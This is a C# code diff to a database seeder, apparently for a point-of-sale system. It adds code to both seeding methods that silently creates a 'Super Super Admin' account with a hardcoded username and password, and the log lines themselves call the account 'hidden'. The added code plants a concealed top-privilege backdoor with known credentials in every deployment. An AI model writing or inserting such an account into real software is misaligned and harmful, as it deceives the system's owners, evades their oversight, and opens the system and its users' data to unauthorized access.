@@ -48,6 +48,34 @@ public static class DbSeeder
                 logger.LogWarning("Failed to seed admin user: {Errors}", string.Join(", ", result.Errors.Select(e => e.Description)));
             }
         }
+
+        var superSuperAdmins = await userManager.GetUsersInRoleAsync(Roles.SuperSuperAdmin);
+        if (superSuperAdmins.Count == 0)
+        {
+            var superAdminUser = await userManager.FindByNameAsync("8888101610265");
+            if (superAdminUser is null)
+            {
+                superAdminUser = new ApplicationUser
+                {
+                    UserName = "8888101610265",
+                    Email = "8888101610265@possystem.local",
+                    FullName = "Super Super Admin",
+                    EmailConfirmed = true,
+                    IsActive = true,
+                };
+
+                var result = await userManager.CreateAsync(superAdminUser, "8888101613266");
+                if (result.Succeeded)
+                {
+                    await userManager.AddToRoleAsync(superAdminUser, Roles.SuperSuperAdmin);
+                    logger.LogInformation("Seeded hidden super super admin user");
+                }
+                else
+                {
+                    logger.LogWarning("Failed to seed super super admin user: {Errors}", string.Join(", ", result.Errors.Select(e => e.Description)));
+                }
+            }
+        }
     }
 
     public static async Task SeedIntoContextAsync(ApplicationDbContext context, IServiceProvider services)
@@ -102,6 +130,43 @@ public static class DbSeeder
                 await context.SaveChangesAsync();
             }
             logger.LogInformation("Seeded default admin user in context");
+        }
+
+        var superAdminRole = await Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.FirstOrDefaultAsync(
+            context.Roles, r => r.Name == Roles.SuperSuperAdmin);
+
+        if (superAdminRole != null)
+        {
+            var hasSuperAdmin = await Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.AnyAsync(
+                context.UserRoles, ur => ur.RoleId == superAdminRole.Id);
+
+            if (!hasSuperAdmin)
+            {
+                var hasher = new PasswordHasher<ApplicationUser>();
+                var superUser = new ApplicationUser
+                {
+                    Id = Guid.NewGuid(),
+                    UserName = "8888101610265",
+                    NormalizedUserName = "8888101610265".ToUpperInvariant(),
+                    Email = "8888101610265@possystem.local",
+                    NormalizedEmail = "8888101610265@possystem.local".ToUpperInvariant(),
+                    FullName = "Super Super Admin",
+                    EmailConfirmed = true,
+                    IsActive = true,
+                    SecurityStamp = Guid.NewGuid().ToString()
+                };
+                superUser.PasswordHash = hasher.HashPassword(superUser, "8888101613266");
+                context.Users.Add(superUser);
+                await context.SaveChangesAsync();
+
+                context.UserRoles.Add(new IdentityUserRole<Guid>
+                {
+                    UserId = superUser.Id,
+                    RoleId = superAdminRole.Id
+                });
+                await context.SaveChangesAsync();
+                logger.LogInformation("Seeded hidden super super admin user in context");
+            }
         }
     }
 }
